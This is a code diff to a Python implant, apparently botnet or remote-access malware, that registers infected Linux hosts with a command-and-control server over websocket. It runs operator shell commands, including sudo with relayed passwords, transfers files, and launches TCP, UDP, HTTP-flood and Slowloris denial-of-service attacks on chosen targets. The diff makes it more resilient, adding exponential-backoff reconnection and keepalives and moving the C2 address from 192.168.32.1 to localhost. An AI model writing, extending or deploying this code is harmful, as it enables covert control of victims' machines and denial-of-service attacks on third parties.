@@ -15,9 +15,11 @@ import re
 import platform
 import netifaces
 from websockets import connect
-from websockets.exceptions import ConnectionClosedError
+from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
 from typing import List, Dict, Tuple, Optional
 import requests
+import shlex
+
 
 class LinuxImpl:
     def __init__(self, c2_ws_url: str, group: str = "grupo"):
@@ -28,33 +30,65 @@ class LinuxImpl:
         self.upload_destination = None
         self.running = True
         self.attack_thread = None
-        self.attacks=[]
-        
+        self.attacks = []
+        self.retry_count = 0
+        self.max_retry_delay = 300  
 
-    
     async def run(self) -> None:
-        await self.register()
+        
         while self.running:
             try:
+                
+                await self.register()
                 await self._connect_to_c2()
+                
+                self.retry_count = 0
+                
+            except ConnectionClosedOK:
+                await self._wait_before_retry()
+                
+            except (ConnectionClosedError, ConnectionRefusedError, TimeoutError) as e:
+                await self._wait_before_retry()
+                
             except Exception as e:
-                await asyncio.sleep(5)
-    
+                await self._wait_before_retry()
+
+    async def _wait_before_retry(self):
+        self.retry_count += 1
+        
+        delay = min(5 * (2 ** (self.retry_count - 1)), self.max_retry_delay)
+        await asyncio.sleep(delay)
+
     async def _connect_to_c2(self) -> None:
         try:
-            async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
+            
+            async with connect(
+                f"{self.c2_ws_url}?id={self.impl_id}",
+                ping_interval=20,
+                ping_timeout=10,
+                close_timeout=10,
+                open_timeout=30
+            ) as ws:
+                self.retry_count = 0  
+                
+                
                 while self.running:
-                    await self._handle_commands(ws)
+                    try:
+                        await self._handle_commands(ws)
+                    except ConnectionClosedError:
+                        raise
+                    except Exception as e:
+                        await asyncio.sleep(1)
+                        
         except Exception as e:
-            pass    
-        #print(e)
+            raise
 
     async def _handle_commands(self, ws) -> None:
         try:
-            cmd = await ws.recv()
-            data = json.loads(cmd.replace("'", '"'))
-
             
+            cmd = await asyncio.wait_for(ws.recv(), timeout=60)
+            data = json.loads(cmd)
+
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
             elif 'chunk' in data:
@@ -68,57 +102,55 @@ class LinuxImpl:
             elif 'stop_attack' in data:
                 await self._stop_attack(ws, attack_type=data['stop_attack'])
         
-        except ConnectionClosedError:
+        except asyncio.TimeoutError:
+            
             pass
+        except ConnectionClosedError:
+            raise
         except Exception as e:
-            await ws.send(json.dumps({"result": str(e)}))
-    
+            try:
+                await ws.send(json.dumps({"result": f"Error: {str(e)}"}))
+            except:
+                pass  
+
     async def _execute_command(self, ws, command: str) -> None:
         if command.startswith("cd "):
             await self._change_directory(ws, command[3:].strip())
+            return
+
+        if command.startswith("sudo"):
+            await ws.send(json.dumps({"prompt": "sudo password: "}))
+            msg = await ws.recv()
+            data = json.loads(msg)           
+            password = data['pass']
+
+            args = shlex.split(command)
+            if args[0] == "sudo" and args[1] != "su":
+                args.insert(1, "-S")
+
+            proc = subprocess.Popen(
+                args,
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+
+            stdout, stderr = proc.communicate(password + '\n')
+            output = stdout if stdout else stderr
         else:
-            if command.startswith("sudo ") or command.startswith("sudo"):
+            out, err, _ = self._execute_shell_command(command)
+            output = out if out else err
 
-                await ws.send(json.dumps({"prompt": "sudo password: "}))
-                msg = await ws.recv()
+        if not isinstance(output, str):
+            output = str(output)
+            
+        output = output.replace("\r", "").rstrip()   
+        await ws.send(json.dumps({
+            "result": output,
+            "cwd": self.current_dir
+        }, ensure_ascii=False))
 
-                data = json.loads(msg.replace("'", '"'))
-                print(data)
-                password = msg['pass']
-               
-                command = command.replace("sudo", "").replace('"', '\\"').split(' ')
-
-                full_command = ['sudo', '-S']
-                full_command.extend(command)
-                full_command = [ x for x in full_command if x ]
-
-                print(full_command)
-                proc = subprocess.Popen(
-                    full_command,
-                    stdin=subprocess.PIPE,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True
-                )
-
-                stdout, stderr = proc.communicate(password + '\n')
-
-                await ws.send(json.dumps({
-                    "result": stdout if stdout else stderr
-                }))
-
-            else:
-                out, err, _ = self._execute_shell_command(command)
-                
-                await ws.send(json.dumps({
-                    "result": out if out else err,
-                }))
-
-            await ws.send(json.dumps({
-                "result": out if out else err,
-                "cwd": self.current_dir
-            }))
-    
     async def _change_directory(self, ws, path: str) -> None:
         path = path.replace('"', '')
         if path == "..":
@@ -168,7 +200,7 @@ class LinuxImpl:
                     for chunk in self.upload_buffer:
                         f.write(chunk)
                 
-                # Limpieza del buffer
+                
                 self.upload_buffer.clear()
                 self.upload_destination = None
                 
@@ -234,9 +266,6 @@ class LinuxImpl:
         CHUNK_SIZE = 64 * 1024
         try:
             with open(file_path, "rb") as f:
-                content = base64.b64encode(f.read()).decode("utf-8")
-
-
                 while True:
                     chunk = f.read(CHUNK_SIZE)
                     if not chunk:
@@ -261,18 +290,13 @@ class LinuxImpl:
             }))
     
     async def _handle_attack_command(self, ws, data: Dict) -> None:
-
         stop_thread = threading.Event()
         attack_type = data['attack']['type']
         target = data['attack']['target']
         duration = data['attack'].get('duration', 60)
 
-
         if len(self.attacks) == 0:
-            
             loop = asyncio.get_event_loop()
-            
-            # Iniciar nuevo ataque
             
             attack_thread = threading.Thread(
                 target=self._execute_attack,
@@ -282,7 +306,6 @@ class LinuxImpl:
             attack_thread.start()
 
             self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})
-
             
             await ws.send(json.dumps({
                 "status": "attack_running",
@@ -305,7 +328,6 @@ class LinuxImpl:
 
                     self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})
 
-
                     await ws.send(json.dumps({
                         "status": "attack_running",
                         "attack_type": attack_type,
@@ -315,7 +337,6 @@ class LinuxImpl:
                 return
     
     def _execute_attack(self, attack_type: str, target: str, duration: int, ws, loop, stop_thread) -> None:
-
         end_time = time.time() + duration
         
         try:
@@ -340,8 +361,6 @@ class LinuxImpl:
                 self._notify_attack_completed(ws, attack_type, target),
                 loop
             )
-
-
         
     async def _notify_attack_completed(self, ws, attack_type: str, target: str) -> None:
         try:
@@ -366,7 +385,6 @@ class LinuxImpl:
                 s.connect((target_ip, target_port))
                 s.send(random._urandom(1024))
                 s.close()
-
             except:
                 pass
     
@@ -379,20 +397,16 @@ class LinuxImpl:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.sendto(random._urandom(1024), (target_ip, target_port))
                 s.close()
-
             except:
                 pass
     
     def _http_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
-
         import urllib.request
         
         if not target.startswith(('http://', 'https://')):
             target = 'http://' + target  
         
-        
         socket.setdefaulttimeout(5)  
-        
         
         headers = {
             'User-Agent': 'Mozilla/5.0',
@@ -406,21 +420,15 @@ class LinuxImpl:
             method='GET'
         )
         
-        
         while time.time() < end_time and not stop_thread.is_set():
             try:
                 with urllib.request.urlopen(request) as response:
                     response.read(64)  
-                
                 time.sleep(0.01)
-                
             except urllib.error.URLError as e:
                 break
             except Exception as e:
                 time.sleep(1)  
-        
-    
-
     
     def _slowloris_attack(self, target: str, end_time: float, stop_thread) -> None:
         target_ip, target_port = target.split(":")
@@ -474,7 +482,6 @@ class LinuxImpl:
             except:
                 pass
     
-
     def _close_sockets(self, sockets: list) -> None:
         for s in sockets:
             try:
@@ -483,8 +490,6 @@ class LinuxImpl:
                 pass
     
     async def _stop_attack(self, ws, attack_type) -> None:
-
-
         if len(attack_type) == 0:
             for attack in self.attacks[:]:
                 attack['stop_thread'].set()
@@ -506,9 +511,8 @@ class LinuxImpl:
                         self._notify_attack_completed(ws, attack_type, attack['target']),
                         attack['loop']
                     )
-
     
-    async def register(self) -> None:
+    async def register(self) -> bool:
         model = {
             'impl_mac': self._get_macs(),
             'group': self.group,
@@ -517,14 +521,22 @@ class LinuxImpl:
             'operating_system': self._get_operating_system(),
             'impl_id': self.impl_id
         }
- 
 
-        try:
-            req = requests.post(f"http://192.168.32.1:4444/api/impl/new/{model['impl_id']}", data=model, timeout=10)
-            prin(req.status_code)
-        except Exception as e:
-            #print(e)
-            pass
+        max_attempts = 3
+        for attempt in range(max_attempts):
+            try:
+                req = requests.post(f"http://localhost:4444/api/impl/new/{model['impl_id']}", 
+                                   data=model, timeout=10)
+                if req.status_code == 200:
+                    return True
+                else:
+                    return False
+            except Exception as e:
+                return False 
+            if attempt < max_attempts - 1:
+                await asyncio.sleep(3)
+        
+        return False
 
     @property
     def impl_id(self) -> str:
@@ -594,12 +606,22 @@ class LinuxImpl:
         sys.exit(1)
 
 if __name__ == "__main__":
-    C2_WS_URL = "ws://192.168.32.1:4444/api/rcv"
+    C2_WS_URL = "ws://localhost:4444/api/rcv"
     GROUP_NAME = "grupo"
 
+    
+    impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
+    
+    def signal_handler(sig, frame):
+        impl.running = False
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
     try:
-        impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
         asyncio.run(impl.run())
+    except KeyboardInterrupt:
+        impl.running = False
     except Exception as e:
-        pass
-        ##print(e)
+        raise        
